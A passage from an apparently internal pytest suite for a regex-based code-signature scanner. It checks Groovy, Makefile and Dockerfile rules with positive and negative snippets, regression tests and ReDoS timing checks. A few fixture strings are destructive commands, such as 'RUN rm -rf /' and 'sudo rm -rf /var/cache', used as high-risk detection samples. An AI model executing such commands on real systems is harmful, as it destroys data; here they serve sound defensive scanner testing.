    runtime call (high_risk_execution) AND it forcefully destroys the
    current execution context (panics_and_aborts). This mirrors accepted
    double-classification precedent elsewhere in this file (e.g. pointer
    address-of vs bitwise AND for `&`).
    """
    high_risk_execution = GROOVY_RULES["high_risk_execution"]
    panics_and_aborts = GROOVY_RULES["panics_and_aborts"]

    snippet = "System.exit(1)"
    assert high_risk_execution.search(snippet)
    assert panics_and_aborts.search(snippet)

    throw_only = "throw new RuntimeException('bad')"
    assert panics_and_aborts.search(throw_only)
    assert not high_risk_execution.search(throw_only)


def test_groovy_closures_and_comprehensions_trailing_closure_intentional_overlap():
    """
    Ambiguity-sweep finding introduced by this issue's own fixes: adding
    paren-less trailing-closure support to both `closures` and
    `comprehensions` means a call like `list.each { it }` now correctly
    matches both. Confirmed intentional, not a bug: the construct
    genuinely is both a collection iterator (comprehensions) AND an
    anonymous inline callback (closures) simultaneously -- the same
    double-classification this codebase already accepts elsewhere (e.g.
    JS's `arr.map(x => x*2)` matching both comprehensions and closures
    via its arrow function).
    """
    closures = GROOVY_RULES["closures"]
    comprehensions = GROOVY_RULES["comprehensions"]

    snippet = "list.each { it * 2 }"
    assert closures.search(snippet)
    assert comprehensions.search(snippet)

    # A closure with no iterator-method prefix satisfies closures alone.
    bare_closure = "def c = { a, b -> a + b }"
    assert closures.search(bare_closure)
    assert not comprehensions.search(bare_closure)


def test_groovy_dead_code_and_doc_no_false_collision():
    """
    Ambiguity check: `dead_code`'s new `/\\*` alternative (added to fix
    the Rule 12 comment-style gap) and `doc`'s `/\\*\\*` JavaDoc-opener
    alternative could plausibly collide now that dead_code also scans
    block comments. Confirmed no false collision on realistic input: a
    real JavaDoc block (`/**` followed by a newline before any content)
    never satisfies dead_code's `[ \\t]*keyword` requirement, since `[
    \\t]*` cannot cross the newline to reach the keyword on the next
    line. dead_code only fires on the single-star `/* keyword` form.
    """
    dead_code = GROOVY_RULES["dead_code"]
    doc = GROOVY_RULES["doc"]

    javadoc = "/**\n * @param x the value\n */"
    assert doc.search(javadoc)
    assert not dead_code.search(javadoc), "real JavaDoc opener incorrectly triggered dead_code"

    block_dead_code = "/* class Foo {} */"
    assert dead_code.search(block_dead_code)
    assert not doc.search(block_dead_code), "single-star block comment incorrectly triggered doc"


# ==============================================================================
# MAKEFILE: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #596, part of epic #518)
# ==============================================================================
MAKEFILE_RULES = LANGUAGE_DEFINITIONS["makefile"]["rules"]

_MAKEFILE_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    # --- PHASE 1 ---
    ("branch", "ifeq ($(OS),Windows_NT)", "OS := Windows_NT"),
    ("args", "\t@echo $(1)", "\t@echo hello"),
    ("structural_boundaries", "CC := gcc", "\techo hello"),
    ("func_start", "build: main.o", ".PHONY: build"),
    # --- PHASE 2 ---
    ("safety", ".POSIX:", "\techo hi"),
    ("safety_bypasses", "\t-rm -f build/*.o", "\trm -f build/*.o"),
    ("high_risk_execution", "\tsudo rm -rf /var/cache", "\trm file.txt"),
    ("io", "\tcurl -O https://example.com/file.tar.gz", "\techo done"),
    ("api", ".PHONY: build", "deploy: main.o"),
    ("state_mutation", "CFLAGS += -Wall", "CFLAGS := -Wall"),
    ("dead_code", "# clean:", "# just a note"),
    ("doc", "## Build the project", "# just a note"),
    ("test", "\tpytest tests/", "\techo done"),
    # --- PHASE 3 ---
    ("concurrency", "\t$(MAKE) -j4", "\t$(MAKE) build"),
    ("globals", "\techo $(CURDIR)/build", "\techo $(TARGET)/build"),
    ("comprehensions", "$(foreach f,$(SOURCES),$(f).o)", "$(SOURCES)"),
    ("scientific", "\tawk '{print $1}' file.txt", "\techo file.txt"),
    ("reflection_metaprogramming", "$(eval $(call template,foo))", "$(wildcard *.c)"),
    ("import", "include config.mk", "config.mk"),
    ("ownership", "# Author: Jane Doe", "# just a note"),
    # --- PHASE 4 ---
    ("planned_debt", "# TODO: refactor build", "# done"),
    ("fragile_debt", "# HACK: workaround for broken toolchain", "# clean"),
    ("spec_exposure", "# [SPEC-123] audit tag", "# just a note"),
    ("macros", "define BUILD_RULE", "BUILD_RULE := foo"),
    # --- PHASE 5 ---
    ("telemetry", "$(info Building target)", "$(warning deprecated)"),
    ("debug_prints", "\t@echo Building...", "\ttrue"),
    ("panics_and_aborts", "$(error Missing dependency)", "$(info ok)"),
    ("thread_sleeps", "\tsleep 5", "\tdate"),
    ("sync_locks", ".NOTPARALLEL:", ".PHONY:"),
    ("immutability_locks", "override CFLAGS += -g", "CFLAGS += -g"),
    ("cleanup", "clean:", "build:"),
    ("encapsulation", "unexport SECRET_VAR", "export PUBLIC_VAR"),
    ("listeners", "\tinotifywait -m ./src", "\tls ./src"),
    ("test_skip", "SKIP_TESTS=1", "RUN_TESTS=1"),
    # --- HYBRID ---
    ("serialization_parsing", "\ttar -czf archive.tar.gz build/", "\tls build/"),
    ("regex_execution", "\tgrep -r TODO src/", "\tls -r src/"),
    ("time_date_logic", "\tdate +%Y-%m-%d", "\techo today"),
    ("ipc_rpc_bridges", "\tssh user@host 'ls'", "\techo host"),
]


@pytest.mark.parametrize("signature,positive,negative", _MAKEFILE_SIMPLE_CASES)
def test_makefile_signature_positive_and_negative(signature, positive, negative):
    pattern = MAKEFILE_RULES[signature]
    assert pattern is not None, f"makefile's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"makefile {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"makefile {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_makefile_dependency_capture_extracts_include_path():
    """
    `_dependency_capture` is the capture-group sibling of `import`, used by
    the Network Graph / Supply Chain Firewall to extract the exact included
    path rather than just detecting presence. Covers all three real forms:
    plain `include`, error-tolerant `-include`, and the GNU-specific
    `sinclude` alias (functionally identical to `-include`).
    """
    pattern = MAKEFILE_RULES["_dependency_capture"]
    m = pattern.search("include config.mk")
    assert m and m.group(1) == "config.mk"
    m2 = pattern.search("-include .depend")
    assert m2 and m2.group(1) == ".depend"
    m3 = pattern.search("sinclude foo.mk")
    assert m3 and m3.group(1) == "foo.mk"
    m4 = pattern.search("  include ../common.mk")
    assert m4 and m4.group(1) == "../common.mk"


def test_makefile_dead_code_single_comment_style_confirmed_no_second_style():
    """
    Comment-style audit (Rule 12): makefile's lexical_family is
    `line_exclusive` -- Make natively uses `#` exclusively for line-level
    comments, with no block-comment delimiter to wire up in parallel. Unlike
    a `standard_block` language (which must cover both `//` and `/* */`),
    there is no second comment style for `dead_code` to silently miss. This
    test documents that the check was performed, not skipped.
    """
    pattern = MAKEFILE_RULES["dead_code"]
    assert pattern.search("# clean:")
    assert pattern.search("    # ifeq ($(DEBUG),1)")
    assert pattern.search("# CFLAGS := -O2")


def test_makefile_lexical_family_no_block_terminator_state_to_confuse():
    """
    Lexical-family audit: because makefile is `line_exclusive` (no block
    comment delimiters at all), none of its structural regexes track
    open/close block-comment state -- every keyword-presence rule (e.g.
    `branch`'s `ifeq`/`endif`) matches via flat line-anchored scanning, not
    depth-tracking. The one native multi-line construct Make actually has is
    `define ... endef` (a macro/template body, not a comment), and since the
    engine performs no special-casing of it either, a stray `endif` or
    target-shaped line inside a `define` body is scanned exactly the same as
    anywhere else in the file -- there is no block-state tracker for it to
    fool.
    """
    branch = MAKEFILE_RULES["branch"]
    define_body_with_endif = "define TEMPLATE\nifeq ($(1),foo)\nbar:\nendif\nendef\n"
    assert branch.search(define_body_with_endif), (
        "branch should still see 'ifeq'/'endif' inside a define body -- there is no "
        "block-state tracker for it to be fooled by in the first place"
    )


def test_makefile_func_start_special_targets_no_false_positive_regression():
    """
    Regression test for a real bug: the negative-lookahead exclusion list
    that keeps GNU Make's built-in special targets (`.PHONY`, `.SECONDARY`,
    etc.) from being hallucinated as real func_start definitions had
    `.PRECIOUS` and `.SECONDARY` each listed *twice* (dead redundancy) while
    missing three legitimate special targets: `.ONESHELL` (single-shell
    recipes, a very common modern idiom), `.NOTINTERMEDIATE`, and
    `.LOW_RESOLUTION_TIME` -- both added in GNU Make 4.4, the exact
    `target_version` this language section targets per its `_meta`.

    Confirmed empirically against the OLD pattern: `.ONESHELL:`,
    `.NOTINTERMEDIATE:`, and `.LOW_RESOLUTION_TIME:` all matched func_start
    (capturing e.g. `.ONESHELL` as if it were a real target/function name),
    exactly the false-positive shape already documented for C++'s macro
    spiral. The new pattern excludes all three (with the duplicate
    PRECIOUS/SECONDARY entries collapsed) while still correctly matching a
    real target.
    """
    old_pattern = re.compile(
        r"^[ \t]*(?!\.(?:PHONY|POSIX|SECONDARY|PRECIOUS|DELETE_ON_ERROR|KEEP_STATE|NOTPARALLEL|WAIT|SILENT|"
        r"EXPORT_ALL_VARIABLES|IGNORE|SUFFIXES|DEFAULT|PRECIOUS|INTERMEDIATE|SECONDARY|SECONDEXPANSION)\b)"
        r"([a-zA-Z0-9_./%-]+)(?=[ \t]*::?)",
        re.M,
    )
    assert old_pattern.search(".ONESHELL:"), "sanity check: bug must reproduce against the old pattern"
    assert old_pattern.search(".NOTINTERMEDIATE:"), "sanity check: bug must reproduce against the old pattern"
    assert old_pattern.search(".LOW_RESOLUTION_TIME:"), "sanity check: bug must reproduce against the old pattern"

    pattern = MAKEFILE_RULES["func_start"]
    assert pattern.pattern.count("PRECIOUS") == 1, "duplicate .PRECIOUS exclusion should have been collapsed"
    assert pattern.pattern.count("SECONDARY") == 1, "duplicate .SECONDARY exclusion should have been collapsed"
    assert not pattern.search(".ONESHELL:"), ".ONESHELL special target incorrectly hallucinated as a func_start"
    assert not pattern.search(".NOTINTERMEDIATE:"), ".NOTINTERMEDIATE special target incorrectly hallucinated"
    assert not pattern.search(".LOW_RESOLUTION_TIME:"), ".LOW_RESOLUTION_TIME special target incorrectly hallucinated"
    assert not pattern.search(".PHONY:"), "existing .PHONY exclusion regressed"
    assert not pattern.search(".PRECIOUS:"), "existing .PRECIOUS exclusion regressed"
    assert not pattern.search(".SECONDARY:"), "existing .SECONDARY exclusion regressed"

    m = pattern.search("build: main.o")
    assert m and m.group(1) == "build", "real target definition regressed"


def test_makefile_safety_bypasses_dash_whitespace_regression():
    """
    Regression test for a real bug, confirmed against the real `make`
    binary (GNU Make 4.3): the ignore-errors recipe prefix `-` was only
    matched when the command immediately followed it with no whitespace
    (`^\\t[ \\t]*-[a-zA-Z0-9_./$]`). But GNU Make strips the modifier
    character AND any whitespace after it before invoking the shell -- both
    `\\t-rm -f x` and `\\t- rm -f x` are valid, equally common ignore-errors
    forms (verified: running both through real `make` produces identical
    output, `rm -f x` with no leading `-` echoed either way). The
    dash-then-space form silently never matched under the old pattern.
    """
    old_pattern = re.compile(r"^\t[ \t]*-[a-zA-Z0-9_./$]|\|\|[ \t]*(?:true|exit[ \t]+0)\b", re.M)
    assert not old_pattern.search("\t- rm -f build/*.o"), "sanity check: bug must reproduce against the old pattern"
    assert old_pattern.search("\t-rm -f build/*.o"), "sanity check: no-space form already worked"

    pattern = MAKEFILE_RULES["safety_bypasses"]
    assert pattern.search("\t-rm -f build/*.o"), "no-space dash form regressed"
    assert pattern.search("\t- rm -f build/*.o"), "dash-then-space form still didn't match"
    assert pattern.search("\t-   rm -f build/*.o"), "dash-then-multiple-spaces form still didn't match"
    assert not pattern.search("\trm -f build/*.o"), "plain recipe with no ignore-errors prefix incorrectly matched"


def test_makefile_debug_prints_semicolon_recipe_regression():
    """
    Regression test for a real bug: `debug_prints` was anchored only to true
    line start (`^[ \\t]*@?(?:echo|printf)`), missing the very common
    one-liner recipe form where a short recipe is written on the same
    physical line as its target, separated by `;` (e.g.
    `check: ; @echo "ok"`). The `echo`/`printf` call there was silently
    never detected.
    """
    old_pattern = re.compile(r"^[ \t]*@?(?:echo|printf)[ \t]+|\$\(warning[ \t]+[^)\n]*\)", re.M)
    assert not old_pattern.search("check: ; @echo ok"), "sanity check: bug must reproduce against the old pattern"

    pattern = MAKEFILE_RULES["debug_prints"]
    assert pattern.search("check: ; @echo ok"), "semicolon one-liner recipe form still didn't match"
    assert pattern.search("foo: bar; echo hi"), "semicolon one-liner recipe form (no @) still didn't match"
    assert pattern.search("\techo hi"), "normal tab-indented echo form regressed"
    assert pattern.search("\t@printf 'building\\n'"), "normal tab-indented printf form regressed"
    assert not pattern.search("foo: bar; ls"), "one-liner recipe with no echo/printf incorrectly matched"


def test_makefile_nested_paren_capture_regression():
    """
    Nested-delimiter regression (Rule 11): `telemetry`'s `$(info ...)`,
    `debug_prints`' `$(warning ...)`, and `panics_and_aborts`' `$(error
    ...)` all used a flat `[^)\\n]*\\)` delimiter matcher, which cannot
    represent one level of nesting. A realistic nested call inside the
    message -- e.g. `$(error Missing dependency: $(call check_dep,foo))`,
    a common pattern for building a descriptive error/warning/info message
    from another macro -- truncated the match at the first (inner) `)`
    instead of capturing the full outer call. Upgraded to the
    one-level-nesting form from the project's Rule 11 playbook.
    """
    old_error = re.compile(r"\$\(error[ \t]+[^)\n]*\)")
    old_warning = re.compile(r"\$\(warning[ \t]+[^)\n]*\)")
    old_info = re.compile(r"\$\(info[ \t]+[^)\n]*\)")

    nested_error = "$(error Missing dependency: $(call check_dep,foo))"
    old_m = old_error.search(nested_error)
    assert old_m and old_m.group() == "$(error Missing dependency: $(call check_dep,foo)", (
        "sanity check: old pattern must reproduce the truncation bug"
    )

    error = MAKEFILE_RULES["panics_and_aborts"]
    m = error.search(nested_error)
    assert m and m.group() == nested_error, f"nested $(error ...) call truncated: {m.group() if m else None!r}"

    nested_warning = "$(warning deprecated: $(call check_dep,foo))"
    old_w = old_warning.search(nested_warning)
    assert old_w and old_w.group() != nested_warning, "sanity check: old pattern must reproduce the truncation bug"
    warning = MAKEFILE_RULES["debug_prints"]
    m2 = warning.search(nested_warning)
    assert m2 and m2.group() == nested_warning, f"nested $(warning ...) call truncated: {m2.group() if m2 else None!r}"

    nested_info = "$(info Building $(call get_target,foo))"
    old_i = old_info.search(nested_info)
    assert old_i and old_i.group() != nested_info, "sanity check: old pattern must reproduce the truncation bug"
    info = MAKEFILE_RULES["telemetry"]
    m3 = info.search(nested_info)
    assert m3 and m3.group() == nested_info, f"nested $(info ...) call truncated: {m3.group() if m3 else None!r}"

    # Non-nested forms must still match cleanly.
    assert error.search("$(error simple message)")
    assert warning.search("$(warning simple message)")
    assert info.search("$(info simple message)")


def test_makefile_nested_paren_redos_immunity():
    """
    ReDoS immunity for the Rule 11 upgrade above: the one-level-nesting
    form `(?:[^()\\n]|\\([^()\\n]*\\))*\\)` must stay linear on an unclosed
    run of nested-looking `(` characters (the two alternatives never match
    overlapping text). Confirmed empirically via direct scaling
    measurement before writing this test (n=2000/4000/8000/16000/32000 on
    `"$(error " + "(" * n`: ~0.00008s/0.00015s/0.00031s/0.00063s/0.00125s,
    a clean ~2x per doubling -- linear, not the ~4x/doubling signature of
    real O(n^2) backtracking).
    """
    error = MAKEFILE_RULES["panics_and_aborts"]
    warning = MAKEFILE_RULES["debug_prints"]
    info = MAKEFILE_RULES["telemetry"]
    assert_redos_immune(error, "$(error " + "(" * 20000, timeout_sec=3.0)
    assert_redos_immune(warning, "$(warning " + "(" * 20000, timeout_sec=3.0)
    assert_redos_immune(info, "$(info " + "(" * 20000, timeout_sec=3.0)
    assert error.search("$(error simple message)")


def test_makefile_hybrid_sensors_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS -- the most severe
    finding in this sweep. All four Hybrid Domain Sensor rules
    (`serialization_parsing`, `regex_execution`, `time_date_logic`,
    `ipc_rpc_bridges`) anchored their line-start alternative with `^\\s*`
    instead of the engine's mandated `^[ \\t]*` (this is the exact
    anti-pattern Rule 5 calls out by name: "NEVER use ^\\s*"). Under
    `re.M`, `\\s` matches `\\n`, so `^\\s*` can cross line boundaries --
    on a long run of blank lines with no keyword anywhere, every one of the
    N blank-line `^` positions re-scans forward through the entire rest of
    the run before failing, producing genuine O(n^2) behavior.

    Confirmed via direct scaling measurement against the OLD pattern on
    `"\\n" * n` (no keyword anywhere) before writing this test:
    n=500/1000/2000/4000/8000 -> 0.0034s/0.0136s/0.0520s/0.2089s/0.8229s
    for `serialization_parsing` -- a clean ~4x increase per doubling, the
    textbook signature of real quadratic backtracking (the other three
    rules showed the identical shape). Swapping to `^[ \\t]*` (which cannot
    cross a newline, bounding each `^` attempt to its own line) resolves it:
    the same n=500..32000 sweep against the new pattern comes in at
    0.00003s..0.00151s, a clean ~2x per doubling.
    """
    old_serialization_parsing = re.compile(r"(?m)^\s*(?:@|-)?(?:tar|unzip|gunzip|jq|sed|awk)\b")
    # Sanity check the bug reproduces directly against the OLD pattern: a
    # bounded (not indefinite) O(n^2) payload that should take multiple
    # seconds under the confirmed-quadratic old behavior but under 1s for
    # any genuinely linear pattern. Timed in-process (not via
    # assert_redos_immune's subprocess-kill path) since the payload is
    # bounded and this is specifically demonstrating the *old* pattern's
    # slowness, not guarding against a hang.
    start = time.perf_counter()
    old_serialization_parsing.search("\n" * 20000)
    old_duration = time.perf_counter() - start
    assert old_duration > 1.0, (
        f"sanity check: old ^\\s* pattern was expected to reproduce the O(n^2) blowup "
        f"(~5s measured during investigation) but only took {old_duration:.3f}s"
    )

    for key in (
        "serialization_parsing",
        "regex_execution",
        "time_date_logic",
        "ipc_rpc_bridges",
    ):
        pattern = MAKEFILE_RULES[key]
        assert_redos_immune(pattern, "\n" * 200000, timeout_sec=3.0)

    assert MAKEFILE_RULES["serialization_parsing"].search("\ttar -czf archive.tar.gz build/")
    assert MAKEFILE_RULES["regex_execution"].search("\tgrep -r TODO src/")
    assert MAKEFILE_RULES["time_date_logic"].search("\tdate +%Y-%m-%d")
    assert MAKEFILE_RULES["ipc_rpc_bridges"].search("\tssh user@host 'ls'")


def test_makefile_io_and_dead_code_redos_immunity():
    """
    ReDoS immunity for `io`'s trailing `>>?[ \\t]*[^ \\t\\n/]+` (a single
    unbounded negated class stopping at whitespace/newline/slash) and
    `dead_code`'s target/assignment alternatives (each a single unbounded
    `[a-zA-Z0-9_./%-]+`/`[a-zA-Z0-9_.-]+` bounded by `\\n` via `re.M`'s `^`
    anchor). Neither has an adjacent second quantifier to backtrack
    against, so both should stay linear even on a long run of matching
    characters with no terminator.
    """
    io = MAKEFILE_RULES["io"]
    assert_redos_immune(io, ">" + "a" * 50000, timeout_sec=3.0)
    assert io.search(">output.log")

    dead_code = MAKEFILE_RULES["dead_code"]
    assert_redos_immune(dead_code, "#" + "a" * 50000, timeout_sec=3.0)
    assert dead_code.search("# clean:")


def test_makefile_cleanup_flag_pattern_redos_immunity():
    """
    ReDoS immunity for `cleanup`'s `\\brm[ \\t]+-[a-zA-Z]*f[a-zA-Z]*\\b` --
    two unbounded character classes flanking a single required literal `f`
    is the classic shape to check for catastrophic backtracking (each
    failed attempt to find `f` can in principle re-partition the consumed
    characters between the two classes). Confirmed linear via direct
    scaling measurement before writing this test on `"rm -" + "a" * n`
    (no `f` present anywhere, forcing the full backtrack range):
    n=2000/4000/8000/16000/32000 -> a clean ~2x per doubling, because only
    one `rm -` occurrence exists in the payload for the engine to anchor
    on and the two classes cannot overlap the same text.
    """
    cleanup = MAKEFILE_RULES["cleanup"]
    assert_redos_immune(cleanup, "rm -" + "a" * 50000, timeout_sec=3.0)
    assert cleanup.search("rm -rf build/")
    assert cleanup.search("clean:")


def test_makefile_macros_and_locks_redos_immunity():
    """
    ReDoS immunity sweep for the remaining single-unbounded-class rules
    anchored by a fixed keyword prefix: `macros` (`define NAME`),
    `encapsulation` (`unexport NAME`), and `immutability_locks`
    (`override NAME`). Each has exactly one quantified character class with
    no adjacent quantifier to backtrack against, so a long run of
    name-shaped characters with no terminator should resolve linearly.
    """
    macros = MAKEFILE_RULES["macros"]
    assert_redos_immune(macros, "define " + "a" * 50000, timeout_sec=3.0)
    assert macros.search("define BUILD_RULE")

    encapsulation = MAKEFILE_RULES["encapsulation"]
    assert_redos_immune(encapsulation, "unexport " + "a" * 50000, timeout_sec=3.0)
    assert encapsulation.search("unexport SECRET_VAR")

    immutability_locks = MAKEFILE_RULES["immutability_locks"]
    assert_redos_immune(immutability_locks, "override " + "a" * 50000, timeout_sec=3.0)
    assert immutability_locks.search("override CFLAGS")


def test_makefile_structural_boundaries_and_state_mutation_no_collision():
    """
    Known ambiguity pattern from the issue template: `structural_boundaries`
    (plain assignment: `:=`, `=`, `?=`, `::=`) and `state_mutation`
    (flux assignment: `+=`, `!=`) are explicitly documented as mutually
    exclusive -- `structural_boundaries`' operator alternative has a
    negative lookahead `(?![ \\t]*=)` specifically to keep `+=`/`!=`/`==`
    out, and neither pattern's keyword form (`vpath`/`undefine`) overlaps
    the other. Confirmed empirically across every real assignment operator
    shape: no line satisfies both signatures, and no legitimate operator
    form is missed by either.
    """
    structural_boundaries = MAKEFILE_RULES["structural_boundaries"]
    state_mutation = MAKEFILE_RULES["state_mutation"]

    for line in ("FOO := bar", "FOO ::= bar", "FOO = bar", "FOO ?= bar"):
        assert structural_boundaries.search(line), f"{line!r} should satisfy structural_boundaries"
        assert not state_mutation.search(line), f"{line!r} incorrectly satisfied state_mutation"

    for line in ("FOO += bar", "FOO != bar"):
        assert state_mutation.search(line), f"{line!r} should satisfy state_mutation"
        assert not structural_boundaries.search(line), f"{line!r} incorrectly satisfied structural_boundaries"


def test_makefile_api_and_cleanup_ambiguity_sweep_clean_target():
    """
    Ambiguity sweep: `api`'s named-target alternative
    (`(?:all|install|build|clean|test|run)[ \\t]*::?`) and `cleanup`'s
    `(?:dist)?clean[ \\t]*::?` both fire on a `clean:` target line.
    Confirmed genuine, intentional double-classification, not a bug: a
    `clean:` target is simultaneously part of the project's conventional
    public build-lifecycle surface (api) AND a resource-teardown routine
    (cleanup) -- both are correct. Also confirmed this is NOT accidentally
    exclusive: `distclean:` (a `cleanup`-only convention, never listed in
    api's named-target alternative) correctly fires cleanup alone, proving
    the overlap on `clean:` is deliberate rather than the two rules always
    moving in lockstep.
    """
    api = MAKEFILE_RULES["api"]
    cleanup = MAKEFILE_RULES["cleanup"]

    assert api.search("clean:")
    assert cleanup.search("clean:")

    assert cleanup.search("distclean:")
    assert not api.search("distclean:"), "distclean should not be part of api's named-target surface"


def test_makefile_func_start_and_macros_no_false_collision():
    """
    Known ambiguity pattern from the issue template (a multi-line macro
    construct hallucinating a function match, as seen with C++'s
    `#define` spiral): makefile's `macros` maps to `define NAME` template
    openers, which never produce the `name:`/`name::` colon shape
    `func_start` requires, so a `define` line never satisfies func_start.
    Also verified the reverse direction empirically: a realistic templated
    target line one might expect INSIDE a `define...endef` body (e.g.
    `$(1): $(2)`) does not accidentally satisfy func_start either, since
    `$` is not part of func_start's captured-name character class -- the
    engine has no special-case for `define` bodies (per the line_exclusive
    family's no-block-tracking behavior), it simply never happens to match
    this particular templated-target shape.
    """
    func_start = MAKEFILE_RULES["func_start"]
    macros = MAKEFILE_RULES["macros"]

    define_line = "define BUILD_TEMPLATE"
    assert macros.search(define_line)
    assert not func_start.search(define_line)

    target_line = "build: main.o"
    assert func_start.search(target_line)
    assert not macros.search(target_line)

    templated_target = "$(1): $(2)"
    assert not func_start.search(templated_target), (
        "templated target inside a define body should not satisfy func_start "
        "('$' is outside func_start's name character class)"
    )


def test_makefile_test_and_regex_execution_no_false_collision():
    """
    Known ambiguity pattern from the issue template (a `.test(`-style regex
    method miscounted as a test-framework call, as seen in TypeScript, or a
    collision with the shell `test`/`[ ... ]` builtin): verified
    empirically rather than assumed. Makefile's `test` signature is scoped
    to specific external test-runner invocations (`npm test`, `pytest`,
    `go test`, `cargo test`, `make test`, etc.) -- it does NOT include the
    bare shell `test` builtin or `[ ... ]` construct at all, so it
    structurally cannot collide with `regex_execution`'s
    `grep`/`egrep`/`sed`/`$(filter ...)` forms, nor with a recipe using
    `test -f foo` for a file-existence guard.
    """
    test_ = MAKEFILE_RULES["test"]
    regex_execution = MAKEFILE_RULES["regex_execution"]

    grep_line = "\tgrep -r TODO src/"
    assert regex_execution.search(grep_line)
    assert not test_.search(grep_line)

    make_test_line = "\tmake test"
    assert test_.search(make_test_line)
    assert not regex_execution.search(make_test_line)

    shell_test_builtin = "\ttest -f config.mk && echo present"
    assert not test_.search(shell_test_builtin), (
        "shell 'test' builtin should not satisfy makefile's test-framework signature"
    )
    assert not regex_execution.search(shell_test_builtin)


# ==============================================================================
# DOCKERFILE: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #579, part of epic #518)
# ==============================================================================
DOCKERFILE_RULES = LANGUAGE_DEFINITIONS["dockerfile"]["rules"]

_DOCKERFILE_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    # --- PHASE 1 ---
    ("branch", "RUN if [ -f file ]; then echo hi; fi", "RUN echo hello"),
    ("args", "ARG VERSION=1.0", "ENV VERSION=1.0"),
    ("structural_boundaries", "WORKDIR /app", "RUN echo hi"),
    ("func_start", "RUN echo hi", "FROM python:3.12"),
    ("class_start", "FROM python:3.12", "RUN echo hi"),
    # --- PHASE 2 ---
    ("safety", "USER appuser", "USER root"),
    ("safety_bypasses", "FROM node:latest", "FROM node:18-alpine"),
    ("high_risk_execution", "RUN rm -rf /", "RUN rm -rf /app/tmp"),
    ("io", "COPY . .", "WORKDIR /app"),
    ("api", "EXPOSE 8080", "WORKDIR /app"),
    ("state_mutation", "ENV NODE_ENV production", "ARG NODE_ENV"),
    ("dead_code", "# RUN old-command", "# just a note"),
    ("doc", 'LABEL maintainer="dev@example.com"', "LABEL env=prod"),
    ("test", "RUN pytest tests/", "RUN echo done"),
    # --- PHASE 3 ---
    ("concurrency", "RUN make -j4", "RUN echo hi"),
    ("ui_framework", "RUN apt-get install -y xvfb", "RUN apt-get install -y curl"),
    ("globals", "ENV APP_HOME /app", "ARG APP_HOME"),
    ("scientific", "FROM nvidia/cuda:12.0-base", "FROM python:3.12"),
    (
        "reflection_metaprogramming",
        "RUN --mount=type=cache,target=/root/.cache pip install -r requirements.txt",
        "RUN pip install -r requirements.txt",
    ),
    ("import", "FROM golang:1.22 AS builder", "RUN go build ."),
    ("ownership", "MAINTAINER Jane Doe <jane@example.com>", "LABEL version=1.0"),
    # --- PHASE 4 ---
    ("planned_debt", "# TODO: fix this later", "# just a note"),
    ("fragile_debt", "# HACK: workaround", "# clean"),
    ("spec_exposure", "# [SPEC-123] compliance tag", "# just a note"),
    ("events", "STOPSIGNAL SIGTERM", 'CMD ["nginx"]'),
    (
        "dependency_injection",
        "RUN --mount=type=secret,id=mysecret cat /run/secrets/mysecret",
        "RUN --mount=type=cache,target=/cache pip install foo",
    ),
    ("macros", "# syntax=docker/dockerfile:1", "# just a comment"),
    ("memory_alloc", 'ENV JAVA_OPTS="-Xmx512m"', "ENV APP_ENV=production"),
    # --- PHASE 5 ---
    ("telemetry", "ENV LOG_LEVEL=info", "ENV APP_ENV=production"),
    ("debug_prints", "RUN echo Building...", "RUN true"),
    ("panics_and_aborts", "RUN test -f file || exit 1", "RUN exit 0"),
    ("thread_sleeps", "RUN sleep 5", "RUN date"),
    ("sync_locks", "RUN flock /var/lock/mylock.lock echo done", "RUN echo done"),
    ("immutability_locks", "FROM alpine@sha256:" + "a" * 64, "FROM node:latest"),
    ("cleanup", "RUN apt-get clean", "RUN apt-get update"),
    ("encapsulation", "FROM golang:1.22 AS builder", "FROM golang:1.22"),
    ("listeners", "EXPOSE 443", "WORKDIR /app"),
    ("test_skip", "RUN npm test || true", "RUN npm test"),
    # --- HYBRID ---
    ("serialization_parsing", "ADD archive.tar.gz /opt/", "COPY . ."),
    ("regex_execution", "RUN grep -r TODO .", "RUN echo done"),
    (
        "time_date_logic",
        "HEALTHCHECK --interval=30s CMD curl -f http://localhost/",
        "HEALTHCHECK CMD curl -f http://localhost/",
    ),
    ("ipc_rpc_bridges", "EXPOSE 8080", "WORKDIR /app"),
]


@pytest.mark.parametrize("signature,positive,negative", _DOCKERFILE_SIMPLE_CASES)
def test_dockerfile_signature_positive_and_negative(signature, positive, negative):
    pattern = DOCKERFILE_RULES[signature]
    assert pattern is not None, f"dockerfile's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"dockerfile {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"dockerfile {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_dockerfile_dependency_capture_extracts_base_image_and_build_stage():
    """
    `_dependency_capture` is the capture-group sibling of `import`, used by
    the Network Graph / Supply Chain Firewall to extract the exact base
    image (group 1, from `FROM`) or build-stage name (group 2, from
    `COPY --from=`) rather than just detecting presence. Covers plain
    `FROM`, `FROM` with a BuildKit flag (`--platform=`) before the image,
    and `--from=` referencing an earlier stage.
    """
    pattern = DOCKERFILE_RULES["_dependency_capture"]
    m = pattern.search("FROM python:3.12-slim")
    assert m and m.group(1) == "python:3.12-slim"

    m2 = pattern.search("FROM --platform=linux/amd64 golang:1.22 AS builder")
    assert m2 and m2.group(1) == "golang:1.22"

    m3 = pattern.search("COPY --from=builder /app/bin /usr/local/bin")
    assert m3 and m3.group(2) == "builder"


def test_dockerfile_dead_code_single_comment_style_confirmed_no_second_style():
    """
    Comment-style audit (Rule 12): dockerfile's lexical_family is
    `line_exclusive` -- Docker natively uses `#` exclusively for line-level
    comments and parser directives, with no block-comment delimiter to wire
    up in parallel. Unlike a `standard_block` language (which must cover
    both `//` and `/* */`), there is no second comment style for
    `dead_code` to silently miss. This test documents that the check was
    performed, not skipped.
    """
    pattern = DOCKERFILE_RULES["dead_code"]
    assert pattern.search("# RUN old-build-step")
    assert pattern.search("    # COPY old-file /app")
    assert pattern.search("# FROM ubuntu:20.04")


def test_dockerfile_lexical_family_no_block_terminator_state_to_confuse():
    """
    Lexical-family audit: because dockerfile is `line_exclusive` (no block
